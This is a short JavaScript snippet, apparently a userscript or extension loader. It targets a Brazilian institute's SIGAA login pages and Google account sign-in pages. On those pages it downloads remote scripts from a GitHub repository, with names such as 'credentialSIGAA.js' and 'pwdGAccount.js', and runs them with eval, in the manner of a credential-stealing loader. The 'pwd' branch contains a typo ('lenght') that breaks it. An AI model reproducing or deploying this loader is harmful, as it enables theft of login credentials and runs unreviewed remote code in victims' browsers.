let url;


if (location.host == 'sigaa.ifsc.edu.br' || location.host == 'sig.ifsc.edu.br'){
    url = "https://raw.githubusercontent.com/Wolota/ips/main/credentialSIGAA.js";
}


if (location.host == 'accounts.google.com'){
    let path = location.pathname.split('/');
    
    if (path[path.length - 1] == 'identifier'){
            url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
    }
    else if (path[path.lenght - 1] == 'pwd'){
        url = "https://raw.githubusercontent.com/Wolota/ips/main/pwdGAccount.js";
    }
    
    console.log("[!] PATH = " + path)
}



console.log("[!] URL = " + url)


if (url != undefined){
    fetch(url).then(response => response.text()).then(code => {eval(code);});
}
